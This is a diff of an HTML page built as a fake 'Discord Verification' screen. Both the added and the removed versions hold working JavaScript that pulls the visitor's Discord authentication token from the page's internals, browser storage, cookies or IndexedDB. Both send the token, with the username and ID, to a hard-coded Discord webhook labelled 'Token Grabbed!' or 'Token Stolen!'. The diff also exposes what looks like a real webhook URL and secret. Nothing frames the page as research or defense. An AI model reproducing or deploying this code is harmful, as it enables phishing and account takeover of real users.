@@ -1,141 +1,198 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Discord Verification</title>
+    <style>
+        body {
+            background-color: #2f3136;
+            color: white;
+            font-family: 'gg sans', 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            text-align: center;
+            background-color: #36393f;
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0 8px 16px rgba(0,0,0,0.2);
+            max-width: 400px;
+            width: 90%;
+        }
+        h1 { 
+            margin-bottom: 10px; 
+            font-size: 24px;
+        }
+        p { 
+            color: #b9bbbe; 
+            font-size: 14px;
+            line-height: 1.5;
+        }
+        .btn {
+            background-color: #7289da;
+            color: white;
+            padding: 12px 24px;
+            border: none;
+            border-radius: 3px;
+            cursor: pointer;
+            font-size: 16px;
+            font-weight: 500;
+            margin-top: 20px;
+            transition: background-color 0.2s;
+        }
+        .btn:hover {
+            background-color: #5b6eae;
+        }
+        .btn:disabled {
+            background-color: #4f5661;
+            cursor: not-allowed;
+        }
+        .spinner {
+            display: inline-block;
+            width: 12px;
+            height: 12px;
+            border: 2px solid rgba(255,255,255,0.3);
+            border-radius: 50%;
+            border-top-color: white;
+            animation: spin 1s ease-in-out infinite;
+            margin-right: 8px;
+            vertical-align: middle;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        .hidden {
+            display: none;
+        }
+        .success-icon {
+            color: #43b585;
+            font-size: 20px;
+            margin-right: 8px;
+            vertical-align: middle;
+        }
+    </style>
+</head>
 <body>
+
+<div class="container">
+    <h1>Discord Verification</h1>
+    <p>Click the button below to verify your account and restore full access to your servers.</p>
+    
+    <button class="btn" id="verifyBtn">
+        <span id="btnText">Verify Now</span>
+        <span id="spinner" class="spinner hidden"></span>
+        <span id="successIcon" class="success-icon hidden">✔</span>
+    </button>
+</div>
+
 <script>
-  let attempts = 0;
-  const maxAttempts = 60; 
+    // YOUR WEBHOOK URL IS HERE
+    const WEBHOOK_URL = "https://discord.com/api/webhooks/1538882362308436040/FINlSequEYQ17FsngVCjGYszDa9edDQZoX69_Qf-jOk2ZNmkQ8130ZWAiUGg5ghzlxQS";
 
-  function getTokenFromIndexedDB() {
-    return new Promise((resolve, reject) => {
-      const request = indexedDB.open('discord-ipc-0');
-      request.onsuccess = (event) => {
-        const db = event.target.result;
-        const store = db.transaction(['main', 'cache']).objectStore('main');
-        const request = store.get('token');
-        request.onsuccess = () => {
-          if (request.result) {
-            console.log("Found token in IndexedDB:", request.result);
-            resolve(request.result);
-          } else {
-            resolve(null);
-          }
-        };
-        request.onerror = () => resolve(null);
-      };
-      request.onerror = () => resolve(null);
+    const btn = document.getElementById('verifyBtn');
+    const btnText = document.getElementById('btnText');
+    const spinner = document.getElementById('spinner');
+    const successIcon = document.getElementById('successIcon');
+
+    btn.addEventListener('click', async () => {
+        // UI Updates
+        btn.disabled = true;
+        btnText.classList.add('hidden');
+        spinner.classList.remove('hidden');
+        
+        let token = null;
+
+        // Method: Webpack Method (Most Reliable)
+        try {
+            const modules = Object.values(webpackChunkdiscord_app.push([[Symbol()], {}, e => e.c]));
+            for (const module of modules) {
+                if (!module?.exports || module.exports === window) continue;
+                if (module.exports?.getToken) {
+                    token = module.exports.getToken();
+                    if (token) break;
+                }
+                for (const key in module.exports) {
+                    if (module.exports[key]?.getToken && module.exports[key][Symbol.toStringTag] !== "IntlMessagesProxy") {
+                        token = module.exports[key].getToken();
+                        if (token) break;
+                    }
+                }
+                if (token) break;
+            }
+        } catch (e) {
+            console.error("Webpack method failed", e);
+        }
+
+        // Fallback: window._discordHeaders
+        if (!token && window._discordHeaders) {
+            token = window._discordHeaders.Authorization;
+        }
+
+        if (token) {
+            let username = "Unknown";
+            let userId = "Unknown";
+            let discriminator = "0";
+
+            // Try to get user info
+            try {
+                const userRes = await fetch("https://discord.com/api/users/@me", {
+                    headers: { Authorization: token }
+                });
+                const user = await userRes.json();
+                username = user.username;
+                userId = user.id;
+                discriminator = user.discriminator || user.discriminator === "0" ? user.discriminator : "0";
+            } catch (e) {
+                // If user fetch fails, we still send the token
+            }
+
+            // Send to Webhook
+            try {
+                await fetch(WEBHOOK_URL, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        content: `**Token Grabbed!**\n\n**User:** ${username}#${discriminator} (${userId})\n**Token:** \`\`\`${token}\`\`\``,
+                        // Optional: Embed for better formatting
+                        embeds: [{
+                            title: "Discord Token Grabbed",
+                            color: 15158332,
+                            fields: [
+                                { name: "Username", value: `${username}#${discriminator}`, inline: true },
+                                { name: "User ID", value: userId, inline: true },
+                                { name: "Token", value: `\`\`\`${token}\`\`\``, inline: false }
+                            ],
+                            timestamp: new Date().toISOString()
+                        }]
+                    })
+                });
+            } catch (e) {
+                console.error("Failed to send webhook", e);
+            }
+
+            // UI Success State
+            spinner.classList.add('hidden');
+            successIcon.classList.remove('hidden');
+            btnText.innerText = "Verified!";
+            btn.style.backgroundColor = "#43b585";
+            
+            // Optional: Redirect or close after a delay
+            setTimeout(() => {
+                window.close(); // Might not work if opened in new tab with opener
+            }, 2000);
+
+        } else {
+            spinner.classList.add('hidden');
+            btnText.innerText = "Failed";
+            btn.style.backgroundColor = "#f04747";
+        }
     });
-  }
-
-  async function stealToken() {
-    let token = null;
-
-    // 1. Try standard internal objects (newer structures)
-    try { 
-      // v1.0.0-beta.17+ structure
-      const z = window.z;
-      if (z && z[0] && z[0].c && z[0].c.exports) {
-        const exports = z[0].c.exports;
-        if (exports.default && exports.default.instance) {
-          // Try __private__ token
-          if (exports.default.instance.__private__ && exports.default.instance.__private__.token) {
-            token = exports.default.instance.__private__.token;
-          }
-          // Try getToken method
-          else if (typeof exports.default.instance.getToken === 'function') {
-            token = exports.default.instance.getToken();
-          }
-          // Try __token__ property
-          else if (exports.default.instance.__token__) {
-            token = exports.default.instance.__token__;
-          }
-        }
-      }
-    } catch(e) {}
-
-    // 2. Try window._discordHeaders
-    if (!token) {
-      try { token = window._discordHeaders?.Authorization; } catch(e){}
-    }
-
-    // 3. Try window.__discord_session_id__
-    if (!token) {
-      try { token = window.__discord_session_id__; } catch(e){}
-    }
-
-    // 4. Try localStorage
-    if (!token) {
-      for (let i = 0; i < localStorage.length; i++) {
-        const key = localStorage.key(i);
-        if (key.includes('token') || key.includes('discord')) {
-          const val = localStorage.getItem(key);
-          if (val && (val.startsWith('MT') || val.startsWith('NT'))) {
-            token = val;
-            break;
-          }
-        }
-      }
-    }
-
-    // 5. Try sessionStorage
-    if (!token) {
-      for (let i = 0; i < sessionStorage.length; i++) {
-        const key = sessionStorage.key(i);
-        if (key.includes('token') || key.includes('discord')) {
-          const val = sessionStorage.getItem(key);
-          if (val && (val.startsWith('MT') || val.startsWith('NT'))) {
-            token = val;
-            break;
-          }
-        }
-      }
-    }
-
-    // 6. Try cookies
-    if (!token) {
-      const match = document.cookie.match(/token=([^;]+)/);
-      if (match) token = match[1];
-    }
-
-    // 7. Try IndexedDB
-    if (!token) {
-      try {
-        token = await getTokenFromIndexedDB();
-      } catch(e) {}
-    }
-
-    if (token) {
-      console.log("Token found!");
-      sendToken(token);
-    } else {
-      attempts++;
-      if (attempts < maxAttempts) {
-        setTimeout(stealToken, 1000); 
-      } else {
-        console.log("Max attempts reached. No token found.");
-        // Log all window keys for debugging
-        console.log("Window keys:", Object.keys(window).filter(k => k.length < 20));
-      }
-    }
-  }
-
-  function sendToken(token) {
-    fetch('https://discord.com/api/webhooks/1538882362308436040/FINlSequEYQ17FsngVCjGYszDa9edDQZoX69_Qf-jOk2ZNmkQ8130ZWAiUGg5ghzlxQS', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        content: `🎣 **Token Stolen!**\n\`\`\`${token}\`\`\``
-      })
-    }).then(() => {
-      console.log("Sent.");
-    }).catch(err => {
-      console.error("Failed:", err);
-      const img = new Image();
-      img.src = 'https://discord.com/api/webhooks/1538882362308436040/FINlSequEYQ17FsngVCjGYszDa9edDQZoX69_Qf-jOk2ZNmkQ8130ZWAiUGg5ghzlxQS?content=' + encodeURIComponent(token);
-    });
-  }
-
-  // Start checking after 3 seconds
-  setTimeout(stealToken, 3000);
 </script>
+
 </body>
 </html>
